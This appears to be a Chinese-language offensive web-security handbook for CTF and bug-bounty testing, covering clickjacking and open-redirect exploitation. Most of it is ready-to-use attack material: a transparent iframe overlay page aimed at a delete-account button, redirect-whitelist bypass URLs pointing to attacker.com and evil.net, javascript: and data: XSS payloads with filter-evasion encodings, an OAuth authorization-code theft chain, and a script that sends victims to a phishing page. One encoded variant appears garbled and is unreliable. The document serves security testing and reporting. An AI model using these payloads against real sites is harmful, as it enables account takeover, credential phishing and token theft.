## [g-cors] CORS 与点击劫持——错误的跨域配置让接口可被读取，iframe 覆盖让点击被劫持，两类都是"配置即漏洞"

### [cors-clickjacking] 点击劫持 iframe 覆盖 | easy | clickjacking;iframe;x-frame-options | 点击劫持
> 站点未配置 `X-Frame-Options` / CSP `frame-ancestors` 时，攻击者把目标页面套进透明 iframe，用户点击的其实是目标页上的按钮。

#### 这个条目的作用
点击劫持（Clickjacking）不靠注入代码，而是靠"页面可以被 iframe 嵌入"这个配置缺陷：攻击者把目标页面透明地盖在自己页面上，再用一个诱饵按钮引导用户点击。用户以为在点"抽奖"，实际点中的是目标页上的"删除账号"。学完本节，你能独立判定一个页面能否被嵌入，并写出完整可用的覆盖利用页。

#### 前置条件
- 一个浏览器（Chrome/Firefox 即可）与开发者工具（F12）
- 目标站点上有一个"危险操作"页面：删除账号、转账、改密码、发布内容的按钮
- 一个可以保存 .html 文件的本地目录（利用页就是本地文件，无需部署服务器）

#### 第 1 步：判定目标页能否被 iframe 嵌入
打开目标危险页面的开发者工具 → Network 面板 → 刷新页面 → 点击该页面的主文档请求 → 看 Response Headers。判定依据：
- 响应头**没有** `X-Frame-Options`，且没有 `Content-Security-Policy: frame-ancestors ...` → 可被嵌入，漏洞成立
- 有 `X-Frame-Options: DENY` 或 `SAMEORIGIN` → 浏览器拒绝嵌入，此页面不可利用
- 有 CSP `frame-ancestors 'none'` 或 `'self'` → 同样不可利用

如果不想开开发者工具，也可以在终端直接请求：
```txt
curl -I https://target.com/delete-account
```
看返回头里有没有 `x-frame-options` 与 `content-security-policy`。预期结果：两个头都缺失 → 进入下一步。如果不行（有防护头）：换一个同域其他页面再测，或直接放弃该页面。

> [!tip]
> 判定只看**主文档响应头**。页面里有没有 iframe、有没有 JS 都不影响嵌入判定，浏览器在加载 iframe 之前就检查这两个头。

#### 第 2 步：写一个最小可见 iframe 测试页
先别透明化，用可见 iframe 确认"能嵌进去、能看到内容"：
```html
<html><body>
<iframe src="https://target.com/delete-account" width="500" height="500"></iframe>
</body></html>
```
保存为 `test.html`，双击用浏览器打开。预期结果：目标页面完整显示在 iframe 里。如果不行：若页面白屏或显示"拒绝连接"，多半是被防护头拦截，回到第 1 步复核响应头。

> [!warn]
> 若目标站有 CSP `frame-ancestors` 或 X-Frame-Options，这里就会加载失败，这是正常现象，不代表测试环境坏了。

#### 第 3 步：定位目标页上危险按钮的位置
目标按钮在 iframe 里的坐标 = 按钮距离 iframe 左上角的偏移。方法：用第 2 步的可见 iframe，在目标页面里按 F12 选中危险按钮，执行 `document.querySelector('按钮选择器').getBoundingClientRect()` 读取它的 `top` 与 `left` 两个数字。CTF 靶场里危险按钮通常就在页面中部，可以先目测估算再微调。

#### 第 4 步：构建透明覆盖页
把 iframe 设成透明、绝对定位，再把诱饵按钮精确叠在目标按钮上方：
```html
<html><body>
<style>
  iframe {
    opacity: 0.01;
    position: absolute;
    top: 0; left: 0;
    z-index: 10;
  }
  .bait {
    position: absolute;
    top: 200px; left: 100px;   /* 与目标按钮坐标对齐 */
    z-index: 20;
  }
</style>
<iframe src="https://target.com/delete-account" width="500" height="500"></iframe>
<button class="bait" style="width:120px;height:40px">点我领奖</button>
</body></html>
```
预期结果：用户看到的只有"点我领奖"按钮，点击时实际命中 iframe 内的目标按钮。如果不行（点了没反应）：说明对齐有偏差，进入第 5 步校准。

> [!warn]
> `opacity` 用 `0.01` 而不是 `0`：完全透明的元素在部分浏览器里有特殊处理，且接近透明的 iframe 更容易排查对齐问题。别忘了 `z-index`，否则诱饵按钮会被 iframe 盖住点不到。

#### 第 5 步：校准对齐
先用 `opacity: 1`（可见）测试：点击诱饵按钮，看是否"看起来"落在目标按钮正中，然后逐像素调整 `.bait` 的 `top/left`。校准完成后把 opacity 改回 0.01。若目标页面有滚动条导致按钮位置随视口变化，把 iframe 宽高设为恰好容纳目标按钮所在的整块区域，或利用 iframe 的 `onload` 先滚动到目标按钮位置再取坐标。

#### 第 6 步：验证利用成立
用测试账号（CTF 里用靶场账号）让"受害者"点击诱饵按钮。预期结果：目标站出现对应操作记录（账号被删、转账成功、密码被改）。验证成立后，在报告中附上响应头证据（无 X-Frame-Options / frame-ancestors）+ 利用页源码 + 点击前后的对比记录。

> [!danger]
> 点击劫持的正确防御是双写：`Content-Security-Policy: frame-ancestors 'none'` + `X-Frame-Options: DENY`。报告里若发现目标只配了其中一个，也值得指出"防护不完整"。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| iframe 白屏/拒绝加载 | 目标页有 X-Frame-Options 或 frame-ancestors | 复核响应头，换同域无防护的页面再测 |
| 点了诱饵没反应 | 按钮坐标没对齐 | 先用 opacity:1 可见对位，再逐像素校准 |
| 诱饵按钮点不到 | 缺 z-index 或 iframe 盖住按钮 | iframe 设 z-index:10，按钮设 z-index:20 |
| 目标页在 iframe 里位置乱跳 | 页面有滚动/懒加载 | 精确设置 iframe 宽高，onload 后定位再取坐标 |
| 点中但操作未生效 | 该操作需要确认弹窗/token | 换一个无确认的按钮，或与 CSRF 思路组合（见 g-csrf） |

#### 实战要点
- 判定三连：`X-Frame-Options` 缺失、CSP `frame-ancestors` 缺失、两者都无 → 可嵌。任何一个存在都先视为不可利用。
- 优先选"点击即生效、无二次确认"的按钮（删除、转账、发布），成功率最高。
- 高级变体：拖拽型点击劫持（drag-and-drop clickjacking）用多个 iframe 拼接指针轨迹；同源页面可在 iframe 里先执行 JS 读取 CSRF token，再配合诱饵提交，绕过 token 校验。
- CTF 中点击劫持几乎总是与 CSRF 组合命题：iframe 内先读 token（同源可读），再骗点击提交带 token 的请求。
- 报告写危害时不要单报"可被点击劫持"，要写"可诱导用户完成 X 操作"，结合目标按钮的实际功能定性。

## [g-redirect] 开放重定向与跳转——跳转参数未校验目标即开放重定向，可被用于钓鱼、token 泄露与 XSS 升级，常被低估

### [redirect-param-find] 跳转参数挖掘 | easy | redirect;parameter;param | 跳转参数
> 先找到"哪些参数决定跳转去向"，再判断是否校验了协议/域名。登录、登出、支付回跳、第三方回调都是重灾区。

#### 这个条目的作用
开放重定向（Open Redirect）的第一步永远是"找到那个决定跳转去向的参数"。很多站点登录成功后要跳回用户之前浏览的页面，于是有了 `?redirect=...`、`?next=...` 这类回跳参数；如果服务端没校验跳转目标，攻击者就能让受害者跳去钓鱼站。本节教你怎么从零找到跳转参数、验证漏洞成立，以及常见校验的绕过姿势。

#### 前置条件
- 目标站点一个普通账号（用于触发登录/登出等流程）
- 浏览器开发者工具（F12 → Network 面板），能看清每个请求的完整 URL
- 一个你自己的可访问域名（没有就用 `http://attacker.com` 占位，验证跳转只看 Location 头即可）

#### 第 1 步：列出站内所有"回跳"场景
开放重定向重灾区按优先级排序：登录成功回跳、登出回跳、SSO/单点登录回跳、支付完成回跳、第三方 OAuth 回调、分享/预览页面。在浏览器里逐个触发这些流程，同时打开 Network 面板。预期结果：看到类似这样的请求：
```http
GET /login?redirect=/dashboard HTTP/1.1
GET /logout?next=/ HTTP/1.1
GET /sso/callback?redirect_uri=https://app.com/cb HTTP/1.1
```
这些带 `redirect` / `next` / `redirect_uri` 之类参数的请求就是候选注入点。如果不行（一个都找不到）：直接跳到第 5 步用参数名字典批量猜。

#### 第 2 步：确认参数确实控制跳转
把参数值改成站内另一个路径，例如把 `redirect=/dashboard` 改成 `redirect=/profile`，回车访问。预期结果：登录/登出后浏览器最终落在 `/profile`，证明该参数确实决定去向。如果不行（还是跳回原页面）：可能参数名猜错，或该参数只在特定流程生效（必须真实走完登录流程），回到第 1 步从真实流量里抄参数名。

#### 第 3 步：换成外域测试是否校验
把参数值改为 `https://attacker.com`：
```txt
https://target.com/login?redirect=https://attacker.com
```
预期结果（漏洞成立）：浏览器最终跳转到 `attacker.com`——Network 面板里能看到一条 302，Location 头就是 `https://attacker.com`。如果不行（还是跳回 target.com）：说明有域名校验，进入第 4 步与第 5 步尝试绕过。

#### 第 4 步：绕域名校验的经典变体
常见的"半吊子"校验是**前缀包含**（正则里写了 `^https://target.com` 或 `startsWith`），这类校验一打就穿：
```txt
https://target.com.attacker.com          # 子域名伪造
https://target.com@attacker.com          # @ 前是用户名，浏览器实际去 attacker.com
https://target.com.evil.net/             # 前缀看起来是 target.com
//attacker.com                           # 协议相对 URL，继承当前协议，可绕过"必须 http(s)"的协议校验
https://attacker.com?u=https://target.com  # 参数里含 target.com，骗过"包含"型校验
```
逐个尝试，看到 302 的 Location 指向外域即为绕过成功。如果不行：说明是精确白名单（域名表比对），单靠这一个参数打不动，转到第 5 步看有没有二次跳转链路。

#### 第 5 步：批量枚举参数名（找不到跳转参数时）
用下面的参数名字典，对目标站任意一个带重定向功能的入口逐个替换测试：
```txt
url redirect next target return next_url jump go u dest
redirect_url redirect_uri callback continue retUrl back rurl
```
快速办法：用浏览器控制台对每个候选名发请求，观察响应是否出现 302 且 Location 跟随注入的值；也可以把抓到的真实回跳参数做同义替换（如 `redirect` → `url`），很多站点后端会同时接收多个别名。

#### 第 6 步：判定与记录
漏洞成立的完整证据链：① 触发真实流程（登录/登出）→ ② 请求里带回跳参数 → ③ 参数值改为外域后 302 Location 指向外域 → ④ 浏览器实际到达外域。把这四步的请求与响应截图保存。若参数只放行 http(s) 但校验可绕过，漏洞定性为"开放重定向"；若还能注入 `javascript:`（见 redirect-pseudo-protocol 条目），定性直接升级为 XSS。

> [!warn]
> 只放行同域前缀但允许"包含关系"的校验是经典缺陷：`https://target.com.attacker.com` 与 `https://attacker.com?u=https://target.com` 经常能绕过"必须以 target.com 开头"的正则。测跳转参数时这四个变体（子域、@、//、参数内含域名）必须全试。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 改了参数还是跳回原页 | 参数名猜错，或校验拦截 | 从 Network 抓真实回跳请求抄参数名，逐字核对 |
| 只有 302 但浏览器没去外域 | 服务端跳转后又有一层前端 JS 重定向 | 看响应体/JS 里是否有二次 `location.href` 拼接 |
| `//attacker.com` 不生效 | 目标强制 https，或协议白名单拦截 | 换 `https://attacker.com` 或 `http://attacker.com` 重试 |
| 子域变体跳了但纯外域不跳 | 校验是"前缀包含 target.com" | 直接利用 `target.com.attacker.com` 这个形态 |
| 参数在 POST body 里 | 回跳参数不止出现在 URL | 用表单/重放工具对 POST 参数同样测一遍 |

#### 实战要点
- 重灾区固定清单：登录、登出、SSO、支付回跳、OAuth 回调——测目标时先扫这五类入口。
- 跳转参数的价值不取决于参数名，而取决于"是否校验"；先证明可控，再谈危害。
- 绕校验四件套：子域伪造、`@` 用户名混淆、协议相对 `//`、参数内包含目标域名。
- 找到开放重定向后不要停：若该参数驱动的是前端 `location.href` / `window.open`，立刻测 `javascript:` 协议（见 redirect-pseudo-protocol）；若存在二次跳转链路，可串联绕过白名单（见 redirect-harm-upgrade）。
- 报告里开放重定向单独定性通常为低危，务必继续做危害升级（钓鱼 / token 泄露 / XSS）再提交。

### [redirect-pseudo-protocol] 伪协议与 javascript: 变体 | hard | redirect;javascript;xss;protocol | 伪协议
> 跳转参数若未限制协议，`javascript:` 直接把开放重定向升级为同源 XSS；`data:` 也是一条协议层面的绕过路径。

#### 这个条目的作用
开放重定向升级成 XSS 的分水岭就是"协议校验"。跳转参数最终要被浏览器导航，如果服务端只拦域名不拦协议，`javascript:` 伪协议会让浏览器**在目标站同源上下文里执行脚本**——这等于一个不需要闭合引号、不需要构造标签的 XSS。本节讲清 `javascript:` 在哪种跳转形态下能触发、哪些变体能绕过关键字过滤，以及 `data:` 的利用方式。

#### 前置条件
- 已按 redirect-param-find 找到一个可控跳转参数（参数值能影响最终跳转去向）
- 分清目标跳转的"层级"：服务端 302（Location 头）还是前端 JS 跳转（`location.href` / `window.open` / `<a href>` 渲染）
- 浏览器开发者工具，能看响应头与执行 JS

#### 第 1 步：先确认跳转发生的层级
看跳转是服务端做的还是前端做的：
```txt
服务端 302: 响应是 3xx + Location 头，浏览器按头导航
前端跳转: 响应 200，页面 JS 里 location.href = 参数 / window.open(参数) / <a href=参数>
```
这一步决定后续 payload 能不能生效：`javascript:` 只在**前端跳转**里可靠执行——`location.href` 赋值、`window.open()`、`<a href>` 渲染返回值时。如果不行（是服务端 302）：服务端把 `javascript:` 写进 Location 头时现代浏览器通常直接拒绝导航，此参数大概率只能做普通开放重定向，转去做钓鱼/危害升级（见 redirect-harm-upgrade）。

> [!danger]
> 判定铁律：跳转参数驱动 `location.href`/`window.open` 且未校验协议时，必然同时测 `javascript:`；即便服务端只放行 http(s)，若前端代码是 `location.href = 'https://' + param`，仍可尝试 `/attacker.com` 配合 `\` 或 `@` 混淆。

#### 第 2 步：直接注入 javascript: 验证执行
把跳转参数改为：
```txt
https://target.com/redirect?url=javascript:alert(document.domain)
```
预期结果：弹窗显示 `target.com`——注意弹的是**目标站域名**，说明脚本在目标站同源上下文执行，这就是同源 XSS。如果不行（没弹窗）：检查跳转层级（回到第 1 步）或是否被过滤（进入第 3 步）。验证时建议用 `alert(document.domain)` 而非 `alert(1)`，弹窗内容直接证明同源，报告里更好写。

#### 第 3 步：过滤了 javascript: 时的变体
若 `javascript:` 被过滤，按注入上下文选变体。href 属性 / 前端拼接场景用大小写与 HTML 实体：
```html
JaVaScRiPt:alert(1)
javascript&#58;alert(1)        <!-- HTML 实体冒号 -->
javascript&colon;alert(1)
&#0000106;avascript:alert(1)   <!-- 十进制实体 -->
```
JS 字符串场景（`window.open` / `location.href` 赋值，服务端不转义时）用 JS 转义：
```javascript
javascript:\u0061lert(1)
\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)
\ud6a5cript:alert(1)           <!-- window.open/location 赋值场景的编码变体 -->
```
预期结果：变体被浏览器解码后仍以 `javascript:` 协议执行。如果不行：过滤在协议白名单层面（枚举只有 http/https），这些变体也过不去 → 该参数降级为开放重定向，转 redirect-harm-upgrade 找组合利用。

> [!warn]
> 编码只在**能被浏览器解码的那个层**有效。HTML 实体（`&#58;`）只在 HTML 属性上下文（如 `<a href>`）被解析；事件属性/JS 上下文里要用 JS 转义（`\u0061`）。先确认参数最终落在哪个上下文，再选编码层。

#### 第 4 步：测试 data: 协议
`data:` 协议在部分跳转实现里同样能带来脚本执行或任意 HTML 内容：
```txt
https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
```
预期结果：浏览器导航到 data: 页面。注意 data: 页面是**独立来源**（opaque origin），`document.domain` 是空值——它主要用于证明"协议校验缺失"和展示可注入任意 HTML 内容。如果不行：浏览器对顶层 data: 导航有限制，该参数对 data: 免疫，不影响 javascript: 的结论。

#### 第 5 步：区分两种漏洞定性
用一张判定表收尾：
```txt
仅允许 http/https 的跳转参数 -> 开放重定向（钓鱼/凭据窃取）
允许 javascript: 的跳转参数 -> 直接 XSS（同源，危害翻倍）
```
同一参数的测试记录要保留：原始注入、变体、最终触发形态。报告里明确写"跳转参数未校验协议，可注入 javascript: 执行同源脚本"，危害等级按 XSS 定，而不是按开放重定向定。

#### 第 6 步：与开放重定向结论合并归档
把本条的结论挂回 redirect-param-find 的测试结果：哪个参数、哪种跳转形态（服务端/前端）、哪些协议被放行。若前端拼接是 `location.href = 'https://' + param`，记下 `//` + `@` 混淆的测试结果。归档后这条链可以直接作为 redirect-harm-upgrade 里的 XSS 升级案例。

> [!tip]
> 测协议白名单的最快顺序：先 `javascript:alert(1)` → 被拦再上大小写/实体/JS 转义 → 全拦则测 `data:` → 全拦再退到"域名校验"层面测开放重定向。一把梭不要卡在某一层。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| javascript: 注入后没弹窗 | 跳转是服务端 302，Location 里的 javascript: 被浏览器拒绝 | 改测前端跳转参数，或接受"仅开放重定向"结论 |
| 弹窗内容不是目标域名 | 落到了 data: 等独立来源 | 换 `alert(document.domain)` 并在目标页面上下文验证 |
| 实体变体不生效 | 参数最终进的是 JS 上下文而非 HTML 属性 | 换 `\u0061` 形式的 JS 转义变体 |
| 所有变体都被拦 | 服务端协议白名单过滤 | 该参数降级为开放重定向，转组合利用 |
| 前端拼接了固定前缀 https:// | 域名校验看的是完整字符串 | 试 `//attacker.com`、`/attacker.com`、`@` 混淆 |

#### 实战要点
- `javascript:` 只在客户端跳转（location.href / window.open / href 渲染）可靠触发，服务端 302 基本免疫——先分层级再选 payload。
- 验证用 `alert(document.domain)`，弹窗内容即同源证据，报告一句话讲清危害。
- 变体按上下文选：HTML 属性用实体，JS 上下文用 `\u` 转义，别混用。
- 协议放行与域名放行是两套校验，分别测试：协议不过还能退到域名层面的开放重定向。
- CTF 里"跳转参数 + javascript:"是最常见组合命题，先测协议再测域名，基本一把梭。
- 报告定级：允许 javascript: 的参数按 XSS 报，别按开放重定向报低了自己。

### [redirect-harm-upgrade] 危害升级与组合利用 | medium | redirect;phishing;token;xss | 重定向危害
> 开放重定向自身通常不评高危，但叠加钓鱼、token 泄露与 XSS 后可升级为认证绕过或会话劫持，报告价值随之上升。

#### 这个条目的作用
开放重定向单独提交往往被降为低危，但它是极好的"杠杆"：叠上钓鱼页、OAuth token 泄露、XSS 之后，整条链能升级到中高危甚至会话劫持。本节教你三条标准升级路径（钓鱼、token 泄露、XSS），以及怎么把多个漏洞串成一条报告价值更高的攻击链。

#### 前置条件
- 已按 redirect-param-find 确认一个开放重定向（参数可控且至少放行 http/https）
- 了解目标站的登录/SSO/OAuth 流程（用于找 token 泄露点）
- 浏览器开发者工具 + 一个能接收请求的测试端点（没有就用 `http://attacker.com/` 占位观察跳转目标）

#### 第 1 步：确认基础开放重定向仍然成立
先回放 redirect-param-find 的验证：改参数为 `https://attacker.com`，确认 302/前端跳转仍指向外域。这是所有升级链的地基，地基不牢后面全是白测。顺手测一下域名校验的强度（子域、@、// 变体哪个能过），后面构造链式 payload 要用。

#### 第 2 步：升级路径一——钓鱼
构造一个"看起来像目标站"的 URL 发给受害者：
```txt
https://target.com/login?redirect=https://target.com.evil.net/phish
```
受害者先看到的是 `target.com` 开头的正规域名，跳转后落在 `target.com.evil.net`（攻击者可控）的钓鱼登录页，输入的账号密码直接进攻击者手里。预期结果：浏览器实际到达攻击者域名，且 URL 前缀在肉眼层面与目标站高度相似。如果不行（目标校验严格，精确白名单）：这条路径换用第 3 步的 token 路径，或找二次跳转（第 5 步）。

> [!warn]
> 钓鱼页要复刻目标登录页结构，这是展示环节；漏洞本身成立与否只看"能否跳转到攻击者域名"，钓鱼页只是把危害讲清楚的道具。

#### 第 3 步：升级路径二——OAuth/SSO token 泄露
找目标站接入的 OAuth/SSO 登录入口，观察授权回调请求：
```txt
登录流程: target 授权 -> 302 到 redirect_uri?code=xxxx
```
测试回调参数校验强度：
```txt
错误校验: 只比对 redirect_uri 前缀/允许通配符 ->
攻击: redirect_uri=https://attacker.com/cb+target.com 形式的混淆
     或先传合法 redirect_uri 拿 code, 再用开放重定向把 code 带出去
```
预期结果（漏洞成立）：`code`/`token` 随回调请求发往攻击者控制的地址，或经开放重定向转跳时通过 Referer / 拼接 URL 外泄。如果不行：回调参数是精确匹配，且 code 与 redirect_uri 强绑定 → 尝试先拿 code 再二次跳转带出（见第 5 步）。注意：code 通常一次性且与 redirect_uri 绑定，报告里写"可截获一次性授权码，配合回调参数缺陷可完成登录劫持"即可，不必真完成整条链。

#### 第 4 步：升级路径三——XSS 升级
若跳转参数驱动前端跳转且协议未校验（见 redirect-pseudo-protocol），直接注入：
```txt
https://target.com/redirect?url=javascript:alert(document.domain)
```
这已经不是"升级"，而是把漏洞定性整体换成同源 XSS。若协议被拦，还有一类弱化升级：跳转参数被拼进前端 DOM 时，利用 `//attacker.com` 配合引号闭合尝试 DOM 注入。预期结果：弹窗显示 target.com 域名 → 按 XSS 报。如果不行（协议、拼接都拦）：维持开放重定向定性，叠加第 2、3 步的钓鱼/token 路径。

#### 第 5 步：二次跳转串联绕过白名单
服务端若有"跳转再跳转"链路（参数 A 跳到一个同样带跳转参数的页面），可串联两次开放重定向绕过域名白名单：
```txt
第一跳: /redirect?url=/another-redirect?url=https://attacker.com
第二跳: /another-redirect?url=... 未校验 -> 最终到 attacker.com
```
预期结果：两次跳转的中间页面都在目标域内，但最终落在外域，绕过"首跳参数必须同域"的校验。如果不行：目标没有二次跳转入口 → 跳过此步，用前三条路径收尾。

#### 第 6 步：与 XSS/CSRF 组合成链并定级
有开放重定向 + 任一一处 XSS/CSRF 时，可以拼成一条自动触发的链：
```html
<script>
location='https://target.com/logout?redirect=//attacker.com/phish'
</script>
```
这条链借助 XSS/CSRF 先让受害者退出登录或触发某操作，再借开放重定向把受害者送往钓鱼页。报告按链式危害定性：
```txt
开放重定向（低）-> token 泄露/钓鱼（中高）-> 与 XSS 组合成会话劫持（高）
```

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 钓鱼链只在部分浏览器生效 | 浏览器对跨域顶层导航的 Referer 策略不同 | 链内显式跳转，不依赖 Referer 自动携带 |
| code 拿到了但没法用 | 授权码一次性/与 redirect_uri 强绑定 | 报告写"可截获"，不强行完成登录劫持 |
| 二次跳转的第二跳不跳 | 第二层也做校验 | 换第二跳的变体（子域/@///）再试 |
| javascript: 被拦导致 XSS 路径断 | 协议白名单 | 退回钓鱼/token 路径，或测 data: 与拼接注入 |
| 报告只写"开放重定向"被降危 | 没做危害升级 | 按第 2-4 步至少补齐一条升级链再提交 |

#### 实战要点
- 三条升级路径独立成立：钓鱼（域名相似）、token 泄露（OAuth 回调）、XSS（javascript:），互不依赖，测完基础重定向就逐条跑。
- OAuth/SSO 的回调参数（redirect_uri）是 token 泄露高发点：前缀匹配、通配符、编码混淆都是经典缺陷。
- 报告按链式危害写：开放重定向（低）→ token 泄露/钓鱼（中高）→ 与 XSS 组合成会话劫持（高），定性随链升级。
- 二次跳转（跳转再跳转）可串联两次开放重定向绕过域名白名单，白名单严格的站先找这个入口。
- CTF 中"跳转参数 + javascript:"是最常见命题，先测协议再测域名；真实 SRC 中优先找 OAuth 回调与登录回跳。
- 留全证据：每一跳的请求/响应、Location 头、以及最终到达的域名，链式报告必须能让人按图索骥复现。
